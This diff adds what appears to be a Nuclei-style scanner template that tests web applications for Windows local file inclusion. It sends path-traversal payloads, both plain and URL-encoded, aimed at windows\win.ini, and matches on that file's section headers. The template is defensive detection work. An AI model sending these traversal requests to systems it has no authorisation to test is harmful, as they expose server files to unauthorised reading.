@@ -1,0 +1,24 @@
+id: whai-lfi-windows
+
+info:
+  name: LFI (Windows Paths)
+  author: whitehat-ai
+  severity: critical
+  description: Tests LFI with Windows path traversal
+  tags: lfi,path-traversal,windows,critical
+  classification:
+    cwe-id: CWE-22
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=..\\..\\..\\windows\\win.ini"
+      - "{{BaseURL}}/?page=..%5c..%5c..%5cwindows%5cwin.ini"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: or
